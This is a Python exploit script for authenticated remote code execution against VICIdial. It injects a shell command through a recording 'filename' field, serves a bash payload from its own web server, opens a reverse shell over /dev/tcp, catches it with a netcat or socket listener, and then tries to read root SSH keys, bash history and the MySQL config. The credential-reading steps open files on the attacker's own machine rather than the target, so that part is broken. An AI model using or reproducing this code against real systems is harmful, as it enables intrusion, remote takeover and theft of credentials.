import string
import threading
import socket
import random
import requests
import os
import re
from base64 import b64encode
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
from faker import Faker


class ExploitRCE:
    def __init__(self, url, whost, wport, lhost=None, lport=None, username=None, password=None, use_netcat=False):
        """
        Initialize all necessary parameters for RCE execution.
        """
        self.TARGET_URL = url
        self.PAYLOAD_WEBSERVER_HOST = whost
        self.PAYLOAD_WEBSERVER_PORT = wport
        self.REVERSE_SHELL_HOST = lhost
        self.REVERSE_SHELL_PORT = lport
        self.ADMIN_USERNAME = username
        self.ADMIN_PASSWORD = password
        self.USE_NETCAT = use_netcat  # Option to use Netcat for reverse shell listening
        self.fake = Faker()
        self.REQUEST_HEADERS = {"User-Agent": self.fake.user_agent()}
        self.MALICIOUS_FILENAME = "." + "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
        self.COMPANY_NAME = f"{self.fake.company().title()} Dial"
        self.CAMPAIGN_ID = "".join(random.choices(string.digits, k=6))
        self.LIST_ID = str(int(self.CAMPAIGN_ID) + 1)
        self.TARGET_IP = urlparse(self.TARGET_URL).hostname

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {
            "+": Fore.GREEN, "-": Fore.RED, "!": Fore.YELLOW, "*": Fore.BLUE, "~": Fore.MAGENTA
        }
        print(header_colors.get(header, Fore.WHITE) + Style.BRIGHT + f"[{header}] {message}" + Style.RESET_ALL)

    def build_requests_session(self):
        self.custom_print("Building requests session...", "*")
        session = requests.Session()
        session.verify = False
        return session

    def poison_recording_files(self, session):
        """
        Poison recording files by sending payload.
        """
        self.custom_print("Sending poisoned recording files...", "*")
        try:
            # Step 1: Authenticating as the admin
            credentials = f"{self.ADMIN_USERNAME}:{self.ADMIN_PASSWORD}"
            credentials_base64 = b64encode(credentials.encode()).decode()
            auth_header = f"Basic {credentials_base64}"
            request_headers = {**self.REQUEST_HEADERS, "Authorization": auth_header}

            target_uri = f"{self.TARGET_URL}/vicidial/admin.php"
            self.custom_print(f"Attempting to authenticate as admin '{self.ADMIN_USERNAME}'...", "*")
            response = session.get(target_uri, headers=request_headers)
            if response.status_code == 200:
                self.custom_print(f"Authenticated successfully as user '{self.ADMIN_USERNAME}'", "+")
            else:
                self.custom_print(f"Failed to authenticate. Status Code: {response.status_code}", "-")
                return False

            # Step 2: Sending the malicious payload
            self.custom_print(f"Preparing malicious payload to deliver a reverse shell.", "*")
            malicious_filename = f"$(curl$IFS@{self.PAYLOAD_WEBSERVER_HOST}:{self.PAYLOAD_WEBSERVER_PORT}$IFS-o$IFS{self.MALICIOUS_FILENAME}&&bash$IFS{self.MALICIOUS_FILENAME})"
            record1_body = {
                "server_ip": self.TARGET_IP,
                "session_name": "session_name",
                "user": self.ADMIN_USERNAME,
                "pass": self.ADMIN_PASSWORD,
                "ACTION": "MonitorConf",
                "format": "text",
                "channel": f"Local/{random.randint(1000, 9999)}@default",
                "filename": malicious_filename,
                "exten": "recording_ext",
                "ext_context": "default",
                "ext_priority": "1",
                "FROMvdc": "YES",
            }
            self.custom_print("Sending the poisoned recording payload...", "*")
            session.post(f"{self.TARGET_URL}/agc/manager_send.php", headers=request_headers, data=record1_body)

            self.custom_print("Malicious payload sent successfully.", "+")
            return True

        except Exception as e:
            self.custom_print(f"Error poisoning recording files: {str(e)}", "-")
            return False

    def payload_webserver(self):
        """
        Start a simple web server to deliver the exploit.
        """
        try:
            self.custom_print(f"Starting web server to deliver the malicious payload on {self.PAYLOAD_WEBSERVER_HOST}:{self.PAYLOAD_WEBSERVER_PORT}", "*")
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.PAYLOAD_WEBSERVER_HOST, int(self.PAYLOAD_WEBSERVER_PORT)))
            server.listen(1)

            client, incoming_address = server.accept()
            message = client.recv(100)

            if b"User-Agent: curl" in message:
                self.custom_print(f"Received cURL request from {incoming_address[0]}", "+")
                exploit_script = (
                    f"#!/bin/bash\n"
                    f"rm {self.MALICIOUS_FILENAME} /var/spool/asterisk/monitor/*curl*\n"
                    f"bash -i >& /dev/tcp/{self.REVERSE_SHELL_HOST}/{self.REVERSE_SHELL_PORT} 0>&1\n"
                )

                http_response = f"HTTP/1.1 200 OK\r\n"
                http_response += f"Content-Length: {len(exploit_script)}\r\n\r\n"
                http_response += exploit_script
                client.sendall(http_response.encode())

            client.close()
            server.close()
            self.custom_print("Webserver closed after delivering payload.", "+")
        except Exception as e:
            self.custom_print(f"Error in webserver: {str(e)}", "-")

    def start_listener(self):
        """
        Start a listener (Netcat or Python socket) to catch reverse shell connections.
        """
        if self.USE_NETCAT:
            try:
                self.custom_print(f"Starting Netcat listener on port {self.REVERSE_SHELL_PORT}", "*")
                os.system(f"nc -lvnp {self.REVERSE_SHELL_PORT}")
            except Exception as e:
                self.custom_print(f"Error while starting Netcat listener: {str(e)}", "-")
        else:
            try:
                self.custom_print(f"Starting Python listener on port {self.REVERSE_SHELL_PORT}", "*")
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.bind((self.REVERSE_SHELL_HOST, int(self.REVERSE_SHELL_PORT)))
                listener.listen(1)
                conn, addr = listener.accept()
                self.custom_print(f"Received connection from {addr}", "+")
                conn.close()
                listener.close()
            except Exception as e:
                self.custom_print(f"Error while starting Python listener: {str(e)}", "-")

    def attempt_ssh_root_credentials(self):
        """
        Attempt to retrieve SSH root credentials, such as from known files or environment.
        """
        self.custom_print("Attempting to retrieve SSH root credentials...", "*")
        possible_files = ["/root/.ssh/id_rsa", "/etc/ssh/sshd_config", "/root/.bash_history"]

        for file in possible_files:
            try:
                self.custom_print(f"Checking {file} for credentials...", "~")
                with open(file, "r") as f:
                    contents = f.read()
                    if "root" in contents:
                        self.custom_print(f"Possible SSH credentials found in {file}", "+")
                        self.custom_print(contents, "~")
                        return True
            except Exception as e:
                self.custom_print(f"Could not access {file}: {str(e)}", "-")

        self.custom_print("No SSH root credentials found.", "-")
        return False

    def retrieve_db_credentials(self, session):
        """
        Attempt to retrieve database credentials from environment variables or config files.
        """
        self.custom_print("Attempting to retrieve database credentials...", "*")
        try:
            db_config_file = "/etc/my.cnf"
            with open(db_config_file, "r") as f:
                contents = f.read()
                self.custom_print(f"Database configuration found in {db_config_file}:", "+")
                self.custom_print(contents, "~")
                return contents
        except Exception as e:
            self.custom_print(f"Could not retrieve database credentials: {str(e)}", "-")
            return None

    def prepare_listeners(self):
        """
        Run both webserver and listener for the reverse shell.
        """
        try:
            self.custom_print("Starting webserver and listener to catch incoming connections...", "*")
            webserver = threading.Thread(target=self.payload_webserver)
            listener = threading.Thread(target=self.start_listener)

            webserver.start()
            listener.start()

            listener.join()
            webserver.join()

            self.custom_print("Listeners and webserver closed.", "+")
        except Exception as e:
            self.custom_print(f"Error while setting up listeners: {str(e)}", "-")

    def run(self):
        """
        Entry point for running the entire RCE.
        """
        session = self.build_requests_session()

        if self.ADMIN_USERNAME and self.ADMIN_PASSWORD:
            self.custom_print(f"Using credentials: {self.ADMIN_USERNAME} / {self.ADMIN_PASSWORD}", "+")
            if self.poison_recording_files(session):
                if self.REVERSE_SHELL_HOST and self.REVERSE_SHELL_PORT:  # Only run listener if lhost/lport are provided
                    self.prepare_listeners()
                else:
                    self.custom_print("No listener required, payload sent and processed.", "+")
                self.retrieve_db_credentials(session)
                self.attempt_ssh_root_credentials()
        else:
            self.custom_print("Error: Admin credentials are required for RCE.", "-")
